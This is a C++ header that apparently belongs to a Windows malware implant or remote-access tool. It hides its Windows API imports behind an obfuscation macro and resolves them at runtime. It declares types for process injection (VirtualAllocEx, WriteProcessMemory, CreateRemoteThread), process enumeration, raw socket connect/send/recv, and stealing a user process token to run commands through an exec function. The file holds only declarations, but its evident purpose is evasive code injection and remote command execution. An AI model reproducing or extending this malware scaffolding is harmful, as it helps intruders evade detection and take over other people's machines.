#pragma once
#include <string>
#include <WS2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include "obfuscate.h"
#include "windows_structs.h"
#include "AutoHandle.h"

#define WINAPI_OBFUSCATE(type, name, dll) reinterpret_cast<type>(resolve_winapi(OBFUSCATE(dll), OBFUSCATE(name)))



typedef HMODULE(WINAPI* load_library_type)(LPCSTR lpLibFileName);

typedef FARPROC(WINAPI* get_proc_address_type)(HMODULE hModule, LPCSTR lpProcName);
typedef int (WINAPI* message_box_type)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
typedef HANDLE(WINAPI* open_process_type)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef HMODULE(WINAPI* get_module_handle_type)(LPCWSTR lpModuleName);
typedef HMODULE(WINAPI* virtual_alloc_ex_type)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID(WINAPI* sleep_type)(DWORD dwMilliseconds);
typedef BOOL(WINAPI* close_handle_type)(HANDLE hObject);
typedef BOOL(WINAPI* write_process_memory_type)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef BOOL(WINAPI* virtual_free_ex_type)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HANDLE(WINAPI* create_remote_thread_type)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef HANDLE(WINAPI* create_toolhelp_snapshot_type)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI* process32_first_type)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(WINAPI* process32_next_type)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef int(WINAPI* wsa_startup_type)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int(WINAPI* wsa_cleanup_type)(VOID);
typedef INT(WINAPI* get_addr_info_type)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef PCSTR(WINAPI* inet_ntop_type)(INT family, const VOID* pAddr, PSTR pStringBuf, size_t StringBufSize);
typedef VOID(WINAPI* free_addr_info_type)(PADDRINFOA pAddrInfo);
typedef BOOL(WINAPI* create_pipe_type)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
typedef HANDLE(WINAPI* get_std_handle_type)(DWORD nStdHandle);
typedef BOOL(WINAPI* create_process_a_type)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL(WINAPI* read_file_type)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef DWORD(WINAPI* get_last_error_type)();
typedef SOCKET(WINAPI* socket_type)(int af, int type, int protocol);
typedef int(WINAPI* close_socket_type)(SOCKET s);
typedef USHORT(WINAPI* htons_type)(USHORT hostshort);
typedef INT(WINAPI* inet_pton_type)(INT Family, PCSTR pszAddrString, PVOID pAddrBuf);
typedef int(WINAPI* connect_type)(SOCKET s, const struct sockaddr FAR* name, int namelen);
typedef int(WINAPI* send_type)(SOCKET s, const char FAR* buf, int len, int flags);
typedef int(WINAPI* recv_type)(SOCKET s, const char FAR* buf, int len, int flags);
typedef BOOL(WINAPI* open_process_token_type)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
typedef BOOL(WINAPI* create_process_as_user_a_type)(HANDLE hToken, LPCSTR lpApplicationName, LPCSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, WORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
BOOL
WINAPI
CreateProcessAsUserW(
    _In_opt_ HANDLE hToken,
    _In_opt_ LPCWSTR lpApplicationName,
    _Inout_opt_ LPWSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCWSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOW lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
);

std::string exec(const char* cmd, const HANDLE token);

const std::string domain_to_ip(const char* domain);

void initilize_winapi();

FARPROC resolve_winapi(const char* dll_name, const char* func_name);

HANDLE get_token_of_user_process();
